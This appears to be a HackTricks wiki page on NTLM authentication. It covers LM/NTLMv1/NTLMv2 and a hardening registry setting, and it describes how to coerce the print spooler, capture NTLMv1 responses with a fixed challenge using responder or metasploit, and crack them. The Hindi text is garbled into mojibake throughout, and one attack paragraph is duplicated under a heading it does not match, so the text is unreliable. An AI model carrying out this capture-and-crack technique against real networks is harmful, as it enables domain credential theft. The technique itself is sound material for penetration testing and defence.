# NTLM

<details>

<summary><strong>рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**ред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

рдЬрд╣рд╛рдВ **Windows XP рдФрд░ Server 2003** рдХрд╛рд░реНрдпрд░рдд рд╣реИрдВ, рд╡рд╣рд╛рдВ LM (Lan Manager) рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдорд╛рдиреНрдп рд╣реИ рдХрд┐ рдЗрдиреНрд╣реЗрдВ рдЖрд╕рд╛рдиреА рд╕реЗ рдзреНрд╡рд╕реНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдПрдХ рдРрд╕рд╛ LM рд╣реИрд╢, `AAD3B435B51404EEAAD3B435B51404EE`, рдПрдХ рд╕реНрдерд┐рддрд┐ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ LM рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рд╣реИ, рдЬреЛ рдПрдХ рдЦрд╛рд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╣реИрд╢ рдХреЛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИред

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **рдХрд░реНрдмреЗрд░реЛрд╕** рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдкреНрд░рдореБрдЦ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред NTLM (NT LAN Manager) рд╡рд┐рд╢реЗрд╖ рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЖрддрд╛ рд╣реИ: Active Directory рдХреА рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐, рдбреЛрдореЗрди рдХреА рдЕрд╕реНрддрд┐рддреНрд╡ рди рд╣реЛрдирд╛, рдХрд░реНрдмреЗрд░реЛрд╕ рдХрд╛ рдЧрд▓рдд рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЗ рдХрд╛рд░рдг рдЕрд╕рдлрд▓рддрд╛, рдпрд╛ рдЬрдм рдХрдиреЗрдХреНрд╢рди IP рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдорд╛рдиреНрдп рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреА рдмрдЬрд╛рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯреНрд╕ рдореЗрдВ **"NTLMSSP"** рд╣реЗрдбрд░ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИред

рдПрд▓рдПрдо, NTLMv1, рдФрд░ NTLMv2 рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрд╛ рд╕рдорд░реНрдерди рдПрдХ рд╡рд┐рд╢реЗрд╖ DLL рджреНрд╡рд╛рд░рд╛ рд╕реБрд╡рд┐рдзрд┐рдд рд╣реИ рдЬреЛ `%windir%\Windows\System32\msv1\_0.dll` рдкрд░ рд╕реНрдерд┐рдд рд╣реИред

**рдореБрдЦреНрдп рдмрд┐рдВрджреБ**:

* рдПрд▓рдПрдо рд╣реИрд╢ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╣реИрдВ рдФрд░ рдПрдХ рдЦрд╛рд▓реА рдПрд▓рдПрдо рд╣реИрд╢ (`AAD3B435B51404EEAAD3B435B51404EE`) рдЗрд╕рдХреЗ рдЕрдкрдпреЛрдЧ рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИред
* рдХрд░реНрдмреЗрд░реЛрд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐ рд╣реИ, NTLM рдХреЗрд╡рд▓ рдирд┐рд╢реНрдЪрд┐рдд рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреИрдХреЗрдЯреНрд╕ "NTLMSSP" рд╣реЗрдбрд░ рджреНрд╡рд╛рд░рд╛ рдкрд╣рдЪрд╛рдиреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред
* рдПрд▓рдПрдо, NTLMv1, рдФрд░ NTLMv2 рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рд┐рд╕реНрдЯрдо рдлрд╝рд╛рдЗрд▓ `msv1\_0.dll` рджреНрд╡рд╛рд░рд╛ рд╕рдорд░реНрдерд┐рдд рд╣реИрдВред

## LM, NTLMv1 рдФрд░ NTLMv2

рдЖрдк рдЬрд╛рдВрдЪ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

### GUI

_secpol.msc_ рдЪрд▓рд╛рдПрдВ -> рд╕реНрдерд╛рдиреАрдп рдиреАрддрд┐рдпрд╛рдБ -> рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк -> рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛: LAN Manager рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрддрд░ред рдпрд╣рд╛рдБ 6 рд╕реНрддрд░ рд╣реИрдВ (0 рд╕реЗ 5 рддрдХ)ред

![](<../../.gitbook/assets/image (919).png>)

### рд░рдЬрд┐рд╕реНрдЯреНрд░реА

рдпрд╣ рд╕реНрддрд░ 5 рд╕реЗрдЯ рдХрд░реЗрдЧрд╛:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## рдмреЗрд╕рд┐рдХ NTLM рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

1. **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЕрдкрдиреЗ **рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ
2. рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рднреЗрдЬрддреА рд╣реИ** рдЬрд┐рд╕рдореЗрдВ **рдбреЛрдореЗрди рдирд╛рдо** рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рднреЗрдЬрддреА рд╣реИ
3. **рд╕рд░реНрд╡рд░** рдЪреБрдиреМрддреА рднреЗрдЬрддрд╛ рд╣реИ
4. **рдХреНрд▓рд╛рдЗрдВрдЯ** рдЪреБрдиреМрддреА рдХреЛ **рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрддрд╛ рд╣реИ
5. **рд╕рд░реНрд╡рд░** **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдбреЛрдореЗрди рдирд╛рдо, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреБрдиреМрддреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬрддрд╛ рд╣реИред рдпрджрд┐ **рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реИ рдпрд╛ рдбреЛрдореЗрди рдирд╛рдо рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рд╣реИ, рддреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ **рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪреА рдЬрд╛рддреА рд╣реИ**ред
6. **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рд╕рдм рдХреБрдЫ рд╕рд╣реА рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрддрд╛ рд╣реИ

**рд╕рд░реНрд╡рд░** рдФрд░ **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдиреЗрдЯрд▓реЙрдЧрди** рд╕рд░реНрд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд╕реБрд░рдХреНрд╖рд┐рдд рдЪреИрдирд▓** рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕рд░реНрд╡рд░ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдЬрд╛рдирддрд╛ рд╣реИ (рдпрд╣ **NTDS.DIT** рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рд╣реИ)ред

### рд╕реНрдерд╛рдиреАрдп NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд╣реА рд╣реИ рдЬреИрд╕рд╛ **рдкрд╣рд▓реЗ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд** рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди **рд╕рд░реНрд╡рд░** рдЙрд╕ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реИрд╢ рдХреЛ рдЬрд╛рдирддрд╛ рд╣реИ** рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдкреВрдЫрдиреЗ рдХреА рдмрдЬрд╛рдп, **рд╕рд░реНрд╡рд░ рдЦреБрдж рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХреГрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### NTLMv1 рдЪреБрдиреМрддреА

**рдЪреБрдиреМрддреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯ** рд╣реИ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ 24 рдмрд╛рдЗрдЯ** рд▓рдВрдмреА рд╣реИред

**рд╣реИрд╢ NT (16 рдмрд╛рдЗрдЯ)** рдХреЛ **3 рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдкреНрд░рддреНрдпреЗрдХ 7 рдмрд╛рдЗрдЯ)**: **рдЖрдЦрд┐рд░реА рд╣рд┐рд╕реНрд╕рд╛ рд╢реВрдиреНрдпреЛрдВ рд╕реЗ рднрд░рд╛ рд╣реЛрддрд╛ рд╣реИ**ред рдлрд┐рд░, **рдЪреБрдиреМрддреА** рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд╕рд╛рде рдЕрд▓рдЧ-рдЕрд▓рдЧ **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкрд░рд┐рдгрд╛рдореА рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдмрд╛рдЗрдЯреНрд╕ **рдЬреЛрдбрд╝реА рдЬрд╛рддреА рд╣реИрдВ**ред рдХреБрд▓: 8 рдмреА + 8 рдмреА + 8 рдмреА = 24 рдмрд╛рдЗрдЯред

**рд╕рдорд╕реНрдпрд╛рдПрдВ**:

* **рдЕрдирд┐рдпрдорд┐рддрддрд╛ рдХреА рдХрдореА**
* 3 рд╣рд┐рд╕реНрд╕реЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ **рд╣рдорд▓реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рддрд╛рдХрд┐ NT рд╣реИрд╢ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ
* **DES рдХреЛ рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**
* 3 рд╡рд╛рдВ рдХреБрдВрдЬреА рд╣рдореЗрд╢рд╛ **5 рд╢реВрдиреНрдпреЛрдВ** рд╕реЗ рдорд┐рд▓рдХрд░ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИред
* **рдПрдХ рд╣реА рдЪреБрдиреМрддреА** рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** **рд╕рдорд╛рди** рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ **рдкреВрд░реНрд╡-рдЧрдгрдирд╛ рд░реЗрдирдмреЛ рдЯреЗрдмрд▓** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрд╣рд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЪреБрдиреМрддреА рджреЗ рд╕рдХрддреЗ рд╣реИрдВ "**1122334455667788**" рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### NTLMv1 рд╣рдорд▓рд╛

рдЖрдЬрдХрд▓ рдЕрдирдХрдВрдлрд╝рд╛рдЗрдиреНрдб рдбреЗрд▓реАрдЧреЗрд╢рди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдкрд╛рдирд╛ рдХрдо рд╣реЛ рд░рд╣рд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк **рдкреНрд░рд┐рдВрдЯ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдЖрдк AD рдкрд░ рдкрд╣рд▓реЗ рд╕реЗ рдХреБрдЫ рдкреНрд░рдорд╛рдгрдкрддреНрд░/рд╕рддреНрд░ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рддрд╣рдд рдХрд┐рд╕реА **рд╣реЛрд╕реНрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рдВрдЯрд░ рд╕реЗ рдкреВрдЫ рд╕рдХрддреЗ рд╣реИрдВ**ред рдлрд┐рд░, `metasploit auxiliary/server/capture/smb` рдпрд╛ `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреБрдиреМрддреА рдХреЛ 1122334455667788** рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдпрд╣ **NTLMv1** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддреЛ рдЖрдк рдЗрд╕реЗ **рдХреНрд░реИрдХ** рдХрд░ рд╕рдХреЗрдВрдЧреЗред\
рдпрджрд┐ рдЖрдк `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдк \*\*рдзреНрд╡рдЬ `--lm` \*\* рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ **рдбрд╛рдЙрдирдЧреНрд░реЗрдб** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ NTLMv1 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (NTLMv2 рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИ)ред_

рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдкреНрд░рд┐рдВрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ **рд▓рдВрдмрд╛ рдФрд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб** рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рд╢рдмреНрджрдХреЛрд╢** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдХреНрд░реИрдХ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ**ред рд▓реЗрдХрд┐рди **NTLMv1** рдкреНрд░рдорд╛рдгреАрдХрд░рдг **DES рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** ([рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ](./#ntlmv1-challenge)), рдЗрд╕рд▓рд┐рдП рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ DES рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЗрд╕реЗ рдХреНрд░реИрдХ рдХрд░ рд╕рдХреЗрдВрдЧреЗ (рдЖрдк [https://crack.sh/](https://crack.sh) рдпрд╛ [https://ntlmv1.com/](https://ntlmv1.com) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

### hashcat рдХреЗ рд╕рд╛рде NTLMv1 рд╣рдорд▓рд╛

NTLMv1 рдХреЛ NTLMv1 рдорд▓реНрдЯреА рдЯреВрд▓ [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) рдХреЗ рд╕рд╛рде рднреА рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ NTLMv1 рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдПрдХ рдРрд╕реА рд╡рд┐рдзрд┐ рдореЗрдВ рд╕реНрд╡рд░реВрдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ hashcat рдХреЗ рд╕рд╛рде рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЖрдЬрдХрд▓ рдЕрдирдХрдВрдлрд╝рд╛рдЗрдиреНрдб рдбреЗрд▓реАрдЧреЗрд╢рди рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдкрд╛рдирд╛ рдХрдо рд╣реЛ рд░рд╣рд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк **рдкреНрд░рд┐рдВрдЯ рд╕реНрдкреВрд▓рд░ рд╕реЗрд╡рд╛** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

рдЖрдк AD рдкрд░ рдкрд╣рд▓реЗ рд╕реЗ рдХреБрдЫ рдкреНрд░рдорд╛рдгрдкрддреНрд░/рд╕рддреНрд░ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдХреЗ рддрд╣рдд рдХрд┐рд╕реА **рд╣реЛрд╕реНрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рд┐рдВрдЯрд░ рд╕реЗ рдкреВрдЫ рд╕рдХрддреЗ рд╣реИрдВ**ред рдлрд┐рд░, `metasploit auxiliary/server/capture/smb` рдпрд╛ `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреБрдиреМрддреА рдХреЛ 1122334455667788** рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдпрд╣ **NTLMv1** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддреЛ рдЖрдк рдЗрд╕реЗ **рдХреНрд░реИрдХ** рдХрд░ рд╕рдХреЗрдВрдЧреЗред\
рдпрджрд┐ рдЖрдк `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдк \*\*рдзреНрд╡рдЬ `--lm` \*\* рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ **рдбрд╛рдЙрдирдЧреНрд░реЗрдб** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ NTLMv1 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (NTLMv2 рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИ)ред_

